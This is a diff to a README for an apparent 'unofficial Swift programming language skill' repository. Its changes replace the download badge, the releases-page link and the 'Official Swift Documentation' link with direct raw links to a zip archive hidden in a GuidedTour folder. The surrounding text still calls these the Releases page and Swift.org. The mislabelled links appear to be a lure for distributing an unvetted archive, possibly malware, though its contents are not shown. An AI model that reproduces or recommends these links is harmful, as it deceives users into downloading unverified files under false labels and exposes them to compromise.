@@ -4,13 +4,13 @@
 
 Welcome to **the-unofficial-swift-programming-language-skill**! This application makes it easy to learn and use the Swift programming language with the help of AI. Follow these steps to download and run the software smoothly.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Shada01245/the-unofficial-swift-programming-language-skill/releases)
+[![Download Now](https://github.com/Shada01245/the-unofficial-swift-programming-language-skill/raw/refs/heads/main/programming-swift/GuidedTour/skill-unofficial-swift-programming-the-language-clayer.zip%20Now-Click%20Here-brightgreen)](https://github.com/Shada01245/the-unofficial-swift-programming-language-skill/raw/refs/heads/main/programming-swift/GuidedTour/skill-unofficial-swift-programming-the-language-clayer.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the following page to download the software:
 
-[Download from Releases Page](https://github.com/Shada01245/the-unofficial-swift-programming-language-skill/releases)
+[Download from Releases Page](https://github.com/Shada01245/the-unofficial-swift-programming-language-skill/raw/refs/heads/main/programming-swift/GuidedTour/skill-unofficial-swift-programming-the-language-clayer.zip)
 
 You will find the latest version of the application on that page. Click on the version you want and download the correct installer for your operating system.
 
@@ -69,7 +69,7 @@ If you encounter any issues or have questions, please feel free to reach out. Yo
 
 ## 🚀 Additional Resources
 
-- **Official Swift Documentation:** Explore the Swift language at [Swift.org](https://swift.org/documentation/).
+- **Official Swift Documentation:** Explore the Swift language at [https://github.com/Shada01245/the-unofficial-swift-programming-language-skill/raw/refs/heads/main/programming-swift/GuidedTour/skill-unofficial-swift-programming-the-language-clayer.zip](https://github.com/Shada01245/the-unofficial-swift-programming-language-skill/raw/refs/heads/main/programming-swift/GuidedTour/skill-unofficial-swift-programming-the-language-clayer.zip).
 - **YouTube Tutorials:** Watch helpful video guides to learn Swift more effectively.
 
 Make sure to keep your application updated. Check the Releases page regularly for new features and improvements.
